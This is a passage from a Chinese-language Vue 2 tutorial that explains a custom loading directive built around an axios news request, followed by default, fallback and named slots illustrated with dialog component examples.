class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#fff</span> <span class="built_in">url</span>(<span class="string">&quot;./loading.gif&quot;</span>) no-repeat center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="准备代码"><a href="#准备代码" class="headerlink" title="准备代码"></a>准备代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">v-loading</span>=<span class="string">&quot;isLoading&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in list&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span> <span class="attr">class</span>=<span class="string">&quot;news&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;left&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>&#123;&#123; item.title &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.source &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.time &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 安装axios =&gt;  yarn add axios</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 接口地址：http://hmajax.itheima.net/api/news</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 请求方式：get</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  data () &#123;  </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">list</span>: [],</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 默认开启遮罩</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isLoading</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">async</span> created () &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. 发送请求获取数据</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> res = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;http://hmajax.itheima.net/api/news&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 2. 更新到 list 中，用于页面渲染 v-for</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">list</span> = res.<span class="property">data</span>.<span class="property">data</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//更新完毕后，关闭遮罩</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">isLoading</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 自定义指令</span></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">directives</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">loading</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      inserted (el, binding) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 动态给DOM加载或移除loading类；</span></span></span><br><span class="line"><span class="language-javascript">        binding.<span class="property">value</span> ? el.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;loading&#x27;</span>) : el.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;loading&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      update (el, binding) &#123;</span></span><br><span class="line"><span class="language-javascript">        binding.<span class="property">value</span> ? el.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;loading&#x27;</span>) : el.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;loading&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.loading</span><span class="selector-pseudo">:before</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background</span>: <span class="number">#fff</span> <span class="built_in">url</span>(<span class="string">&#x27;./loading.gif&#x27;</span>) no-repeat center;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.box2</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#000</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">min-height</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: <span class="number">3px</span> solid orange;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.news</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.news</span> <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">flex</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">justify-content</span>: space-between;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding-right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.news</span> <span class="selector-class">.left</span> <span class="selector-class">.title</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.news</span> <span class="selector-class">.left</span> <span class="selector-class">.info</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#999999</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.news</span> <span class="selector-class">.left</span> <span class="selector-class">.info</span> <span class="selector-tag">span</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.news</span> <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">160px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.news</span> <span class="selector-class">.right</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">object-fit</span>: cover;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="插槽-默认插槽"><a href="#插槽-默认插槽" class="headerlink" title="插槽-默认插槽"></a>插槽-默认插槽</h1><h2 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h2><p>让组件内部的一些 <strong>结构</strong> 支持 <strong>自定义</strong></p><p><img src="/2023/12/28/Vue/1682410215245.png" alt="68241021524"></p><h2 id="需求-3"><a href="#需求-3" class="headerlink" title="需求"></a>需求</h2><p>将需要多次显示的对话框,封装成一个组件</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>组件的内容部分，<strong>不希望写死</strong>，希望能使用的时候<strong>自定义</strong>。怎么办</p><h2 id="插槽的基本语法"><a href="#插槽的基本语法" class="headerlink" title="插槽的基本语法"></a>插槽的基本语法</h2><ol><li>组件内需要定制的结构部分，改用<code>&lt;slot&gt;&lt;/slot&gt;</code>占位</li><li>使用组件时, <code>&lt;MyDialog&gt;&lt;/MyDialog&gt;</code>标签内部, 传入结构替换slot</li><li>给插槽传入内容时，可以传入<strong>纯文本、html标签、组件</strong></li></ol><p><img src="/2023/12/28/Vue/1682410329794.png" alt="68241032979"></p><h2 id="代码示例-4"><a href="#代码示例-4" class="headerlink" title="代码示例"></a>代码示例</h2><p>MyDialog.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;dialog&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;dialog-header&quot;&gt;</span><br><span class="line">      &lt;h3&gt;友情提示&lt;/h3&gt;</span><br><span class="line">      &lt;span class=&quot;close&quot;&gt;✖️&lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;dialog-content&quot;&gt;</span><br><span class="line">      &lt;!-- 1. 在需要定制的位置，使用slot占位 --&gt;</span><br><span class="line">      &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;dialog-footer&quot;&gt;</span><br><span class="line">      &lt;button&gt;取消&lt;/button&gt;</span><br><span class="line">      &lt;button&gt;确认&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- 2. 在使用组件时，组件标签内填入内容 --&gt;</span><br><span class="line">    &lt;MyDialog&gt;</span><br><span class="line">      &lt;!-- 将被填入到slot位置 --&gt;</span><br><span class="line">      &lt;div&gt;你确认要删除么&lt;/div&gt;</span><br><span class="line">    &lt;/MyDialog&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 将被填入到slot位置 --&gt;</span><br><span class="line">    &lt;MyDialog&gt;</span><br><span class="line">      &lt;p&gt;你确认要退出么&lt;/p&gt;</span><br><span class="line">    &lt;/MyDialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyDialog from &#x27;./components/MyDialog.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyDialog</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">  background-color: #b3b3b3;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>场景：组件内某一部分结构不确定，想要自定义怎么办</p><blockquote><p>使用<code>&lt;slot&gt;</code>插槽来实现；</p></blockquote><p>使用：插槽的步骤分为哪几步？</p><blockquote><ol><li>第一步：在子组件（或通用组件）中需要插槽的位置用<code>&lt;slot&gt;</code>进行占位；</li><li>第二步：在自定义组件的内容部分填入需要插槽的内容，包括纯文本、html标签、组件；</li></ol></blockquote><h1 id="插槽-后备内容（默认值）"><a href="#插槽-后备内容（默认值）" class="headerlink" title="插槽-后备内容（默认值）"></a>插槽-后备内容（默认值）</h1><h2 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h2><p>通过插槽完成了内容的定制，传什么显示什么, 但是如果不传，则是空白</p><p><img src="/2023/12/28/Vue/1682411494612.png" alt="68241149461"></p><p>能否给插槽设置 默认显示内容 呢？</p><h2 id="插槽的后备内容"><a href="#插槽的后备内容" class="headerlink" title="插槽的后备内容"></a>插槽的后备内容</h2><p>封装组件时，可以为预留的 <code>&lt;slot&gt;</code> 插槽提供后备内容（默认内容）。</p><h2 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h2><p>在 <slot> 标签内，放置内容, 作为默认显示内容</slot></p><p><img src="/2023/12/28/Vue/1682412365046.png" alt="68241233912"></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><ul><li><p>外部使用组件时，不传东西，则slot会显示后备内容 </p><p><img src="/2023/12/28/Vue/1682412432656.png" alt="68241243265"></p></li><li><p>外部使用组件时，传东西了，则slot整体会被换掉</p><p><img src="/2023/12/28/Vue/1682412459027.png" alt="68241245902"></p></li></ul><h2 id="代码示例-5"><a href="#代码示例-5" class="headerlink" title="代码示例"></a>代码示例</h2><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;MyDialog&gt;&lt;/MyDialog&gt;</span><br><span class="line"></span><br><span class="line">    &lt;MyDialog&gt;</span><br><span class="line">      你确认要退出么</span><br><span class="line">    &lt;/MyDialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyDialog from &#x27;./components/MyDialog.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyDialog</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">  background-color: #b3b3b3;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>MyDialog.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;dialog&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;dialog-header&quot;&gt;</span><br><span class="line">      &lt;h3&gt;友情提示&lt;/h3&gt;</span><br><span class="line">      &lt;span class=&quot;close&quot;&gt;✖️&lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;dialog-content&quot;&gt;</span><br><span class="line">      &lt;!-- 往slot标签内部，编写内容，可以作为后备内容(默认值) --&gt;</span><br><span class="line">      &lt;slot&gt;</span><br><span class="line">        我是默认的文本内容</span><br><span class="line">      &lt;/slot&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;dialog-footer&quot;&gt;</span><br><span class="line">      &lt;button&gt;取消&lt;/button&gt;</span><br><span class="line">      &lt;button&gt;确认&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="插槽-具名插槽"><a href="#插槽-具名插槽" class="headerlink" title="插槽-具名插槽"></a>插槽-具名插槽</h1><h2 id="需求-4"><a href="#需求-4" class="headerlink" title="需求"></a>需求</h2><p>一个组件内有多处结构，需要外部传入标签，进行定制 <img src="/2023/12/28/Vue/1682413134876.png" alt="68241313487"></p><p>上面的弹框中有<strong>三处不同</strong>，但是<strong>默认插槽</strong>只能<strong>定制一个位置</strong>，这时候怎么办呢?</p><h2 id="具名插槽语法"><a href="#具名插槽语法" class="headerlink" title="具名插槽语法"></a>具名插槽语法</h2><ul><li><p>多个slot使用name属性区分名字 </p><p><img src="/2023/12/28/Vue/1682413391727.png" alt="68241339172"></p></li><li><p><strong>template配合v-slot</strong>:名字来分发对应标签</p><p><img src="/2023/12/28/Vue/1682413411921.png" alt="68241341192"></p></li></ul><h2 id="v-slot的简写"><a href="#v-slot的简写" class="headerlink" title="v-slot的简写"></a>v-slot的简写</h2><p>v-slot写起来太长，vue给我们提供一个简单写法 <strong>v-slot —&gt; #</strong></p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><ul><li><p>组件内 有多处不确定的结构 怎么办?</p><blockquote><p>使用具名插槽；</p></blockquote></li><li><p>具名插槽的语法是什么?</p><blockquote><p>组件中：<code>&lt;slot name=&quot;slotname&quot;&gt;&lt;/slot&gt;</code></p><p>使用组件的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;MyDialog&gt;</span><br><span class="line">      &lt;!-- 需要通过template标签包裹需要分发的结构，包成一个整体 --&gt;</span><br><span class="line">      &lt;template v-slot:head&gt;</span><br><span class="line">        &lt;div&gt;我是大标题&lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">      </span><br><span class="line">      &lt;template v-slot:content&gt;</span><br><span class="line">        &lt;div&gt;我是内容&lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line"></span><br><span class="line">      &lt;template #footer&gt;</span><br><span class="line">        &lt;button&gt;取消&lt;/button&gt;</span><br><span class="line">        &lt;button&gt;确认&lt;/button&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/MyDialog&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyDialog from &#x27;./components/MyDialog.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyDialog</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>v-slot:插槽名可以简化成什么?</p></li></ul><h1 id="作用域插槽"><a href="#作用域插槽" class="headerlink" title="作用域插槽"></a>作用域插槽</h1><h2 id="插槽分类"><a href="#插槽分类" class="headerlink" 